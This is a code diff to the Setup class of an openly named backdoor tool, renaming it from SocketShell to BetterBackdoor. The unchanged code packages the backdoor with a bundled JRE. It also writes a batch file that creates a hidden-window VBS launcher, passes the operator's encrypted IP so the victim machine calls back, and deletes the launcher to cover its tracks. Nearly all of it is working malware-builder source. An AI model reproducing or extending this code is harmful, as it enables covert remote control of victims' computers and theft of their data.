@@ -1,11 +1,11 @@
-package com.github.thatcherdev.socketshell;
+package com.github.thatcherdev.betterbackdoor;
 
 import java.io.File;
 import java.io.FileNotFoundException;
 import java.io.IOException;
 import java.io.PrintWriter;
 import org.apache.commons.io.FileUtils;
-import com.github.thatcherdev.socketshell.backend.Utils;
+import com.github.thatcherdev.betterbackdoor.backend.Utils;
 
 public class Setup {
 
@@ -16,14 +16,14 @@ public class Setup {
 	 * @param packageJre if the a JRE should be packaged with backdoor
 	 * @throws IOException
 	 */
-	public static void compile(boolean packageJre) throws IOException {
+	public static void create(boolean packageJre) throws IOException {
 		if (packageJre) {
 			String jrePath = System.getProperty("java.home");
 			FileUtils.copyDirectory(new File(jrePath + File.separator + "bin"),
 					new File("backdoor" + File.separator + "jre" + File.separator + "bin"));
 			FileUtils.copyDirectory(new File(jrePath + File.separator + "lib"),
 					new File("backdoor" + File.separator + "jre" + File.separator + "lib"));
-		} else if (SocketShell.os.contains("Linux") && new File("jre").isDirectory())
+		} else if (BetterBackdoor.os.contains("Linux") && new File("jre").isDirectory())
 			FileUtils.copyDirectory(new File("jre"), new File("backdoor" + File.separator + "jre"));
 		FileUtils.copyDirectory(new File("scripts"), new File("backdoor" + File.separator + "scripts"));
 		FileUtils.copyFile(new File("target" + File.separator + "run.jar"),
@@ -49,8 +49,8 @@ public class Setup {
 		out.println(
 				"@echo off\n%~d0 & cd %~dp0\necho Set objShell = WScript.CreateObject(\"WScript.Shell\")>run.vbs\necho objShell.Run \"cmd /c if exist "
 						+ jrePath + "\\ (" + jrePath + "\\bin\\java " + "-jar " + jarName + ".jar "
-						+ Utils.crypt(Utils.getIP(), "SocketShellIP") + ") else (java -jar " + jarName + ".jar "
-						+ Utils.crypt(Utils.getIP(), "SocketShellIP")
+						+ Utils.crypt(Utils.getIP(), "BetterBackdoorIP") + ") else (java -jar " + jarName + ".jar "
+						+ Utils.crypt(Utils.getIP(), "BetterBackdoorIP")
 						+ ")\", ^0, True>>run.vbs\nstart run.vbs\ncall:delvbs\n:delvbs\nif exist run.vbs (\n timeout 1 > nul\n del run.vbs\n @exit\n"
 						+ ") else (\ncall:delvbs\n)\ngoto:eof");
 		out.flush();
